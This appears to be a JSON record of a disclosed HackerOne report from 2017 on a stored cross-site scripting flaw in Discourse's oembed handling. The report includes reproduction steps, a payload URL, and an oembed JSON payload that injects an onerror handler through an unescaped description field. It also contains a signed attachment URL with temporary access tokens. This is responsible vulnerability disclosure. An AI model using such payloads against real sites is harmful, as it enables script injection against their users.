@@ -1,0 +1,129 @@
+{
+  "id": 197914,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTc5MTQ=",
+  "url": "https://hackerone.com/reports/197914",
+  "title": "Stored XSS in posts because of absence of oembed variables values escaping",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-01-12T19:24:00.373Z",
+  "submitted_at": "2017-01-12T19:24:00.373Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "skavans",
+    "url": "/skavans",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16893,
+    "url": "https://hackerone.com/discourse",
+    "handle": "discourse",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Discourse",
+      "twitter_handle": "discourse",
+      "website": "https://discourse.org",
+      "about": "Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-01-20T23:50:01.965Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-01-20T23:50:01.737Z",
+  "team_member_agreed_on_going_public_at": "2017-01-20T23:48:57.505Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello!\n\n**Steps to reproduce:**\n1. Paste this payload URL in the post: http://89.223.28.48/oembed_video.html?uncache\n2. Save the post and you will see the XSS will fire.\n\n{F151922}\n\nThe vulnerability exists because of absence of oembed variables values escaping.\nThere is the oembed link in the payload page:\n\n```html\n<link type='application/json+oembed' href='http://89.223.28.48/oembed.json'>\n```\nAs you can see the onebox parser goes to this oembed URL to get the data:\n```\n64.71.168.198 - - [12/Jan/2017:19:13:52 +0000] \"GET /oembed_video.html HTTP/1.1\" 200 388 \"-\" \"Ruby\"\n64.71.168.198 - - [12/Jan/2017:19:13:52 +0000] \"GET /oembed.json HTTP/1.1\" 200 389 \"-\" \"Ruby\"\n```\nThe content of *oembed.json* is:\n```json\n{\n        \"type\": \"image\",\n        \"image\": \"xss\",\n        \"description\": \"descr' onerror='alert(/XSS by skavans/)\",\n        \"image_width\": 1,\n        \"image_height\": 1\n}\n```\n\nSo the unescaped data is injected in the raw HTML at [this line](https://github.com/discourse/onebox/blob/master/lib/onebox/engine/whitelisted_generic_onebox.rb#L284) of generic_whitelisted onebox engine that leads to XSS vulnerability.\n\nThe example post with stored XSS inside is: https://try.discourse.org/t/this-is-just-one-test/632\n\nPlease let me know if you need some extra information to locate and fix the bug.",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 151922,
+      "file_name": "______________2017-01-12___22.17.11.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/151/922/97113a6f1c3c6556842771e954d0b7f4ca2f9298/______________2017-01-12___22.17.11.png?response-content-disposition=attachment%3B%20filename%3D%22______________2017-01-12___22.17.11.png%22%3B%20filename%2A%3DUTF-8%27%27______________2017-01-12___22.17.11.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUV2CGWUB%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T153125Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJIMEYCIQCTXpxsFPt1L%2FkCxOVB1B3bBXWaNOlY5wahEl5r2sxxBgIhANZZTGMjD1dUdM6hu53hcgIE%2BhLd%2F5bYa3ZdxidZkTITKroFCOf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igx%2FJgTOGH7sfsex8cIqjgU0qgSJ9WhXa7evAxE%2B%2BIf9cl6N4OunmKi1bbV3Gj4oEXwaOD6BD53PpBRgoDh3BKRK1f7KsrMtk7oQKfjJkC24OrFpqNdFReGiSfZ1iwGS3LhDzFVwQdn1%2BK8Ol6C6ex3caYbFTIhVw0SAtKwqliL%2F93RaJd7oREgGvzI8IG0T3IAxQX7%2FCcOBfHTXizPiBLNrfLpqwm0Nwl2%2F1nMwD%2FIlZVXXGLkOMUb1J4dBuH2ILkLdJY5uvzxYr80JyJqgUzwRAkazE1oYfLyHJGRBgJHJ2dA1FSp7B%2BGFd%2Fo%2FfcRyyL7GyD%2BuH8BKk%2F0bR8j9qmQnftDc7%2B4mafAudu0YWNx47h7wl0lF9X9f5SnqU4ImIYjPUeS8zJ%2BElpfJAshC9lqkuO1uuQrQlknnzGulGKpUkLj3dE0y2TI5tUrjC%2FtF8%2FIsUntd2eVaBF%2FYE%2BelZD6Zftc9ZvvVQhImYlFGiHGzEun8Zp77ikhc7pdZNm55EhQZoQW0aLxeUZRGEDT65OOfGiqUSk0YPu1y7idAZZy7M5yu8GzeYOvmYsGOt0aKWBoH6bquc9IcUzfFKfSiTQ1vsts7yC3dadpPkBxwfBkn9bh6bKJf7CAFfueAhP%2Fbc%2By%2FEF3wSNK%2BE2PDtFfzNfck9xkYhPJbdwq8L11C4x3EM7BkGkGGjoml%2FCdzIWn9jXxMZhMejeAheaWqKqnR4rmFmYlvfiJLpuQAouvvUzpfQo%2BuzwtTLMJrl8P%2FoIH7WVxm2WwZy4tO%2Blx3c7%2F7fv9LSeE5E%2FOgOg%2B6bSI4RkNXAtNyPDG%2FeY7u5VFXYYHBgji2BWbqq0UGfKEvusUXUVtwFuAniojpSOzeVkfC9Oow64qoX4LMGa%2FZlsSi55wwtv78zwY6sAFsfiizT40h6BNyeJmgpnfo1N6cLUC4QuJhp2F6NPTJJuTaz%2F0q%2Fv4xHYTI8pFZShEkmnGRggZOoBtIuL5ZHtnM2olXFY3CVC9y72drP3OwIIToCP3Ui4zOhTQV2R78aLq8IQJyVf7nMR6yVlk2gQI1svAuSOAjVsTkyK%2Bd7vItexRmem3Td1bRFMAPLnCKsHM5FYhtHwhI%2BaSL6Y2BjpQeVoBT5xKJrTpvsPBYzzJp%2FA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cc4cbafd259c91f8651d8b87ab358b77a4b7c59697a3cf3e98b61bc211a2d78e",
+      "file_size": 69877,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-02-19T23:48:57.695Z",
+  "allow_singular_disclosure_after": -290792547.4305717,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "bogdantc",
+    "sak_ura",
+    "spam404",
+    "yaworsk",
+    "skavans",
+    "malcolmx",
+    "mpz",
+    "eveeez",
+    "japz",
+    "fantam1",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
